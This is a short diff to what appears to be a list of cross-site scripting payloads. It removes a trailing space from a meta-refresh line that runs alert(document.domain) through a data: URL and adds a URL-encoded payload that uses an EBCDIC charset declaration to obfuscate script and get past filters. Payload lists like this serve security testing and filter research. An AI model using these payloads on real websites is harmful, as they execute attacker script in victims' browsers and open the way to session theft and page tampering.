@@ -125,4 +125,5 @@ something%00html
 {'}
 |
 }
-<meta http-equiv="Refresh" content="0;url=data:,<script>alert(document.domain)</script>"> 
+<meta http-equiv="Refresh" content="0;url=data:,<script>alert(document.domain)</script>">
+%3Cmeta%20charset=cp1025%3E%27%20L%C9%86%D9%81%D4%85%40%C9%84~[%40%D6%95%D4%96%E4%A2%85%D6%A5%C5%99~m~%60JZ^NNm^mm~mNm^mmmm~mmNmm^mmmmmm~mmmmNmm^[JMOO}}N}}]JmZNMOO}}N}}]JmmZNMOO}}N}}]JmmmmZNMO}}N}}]JmZNM[N}}]JmmmmmmZZMm]n
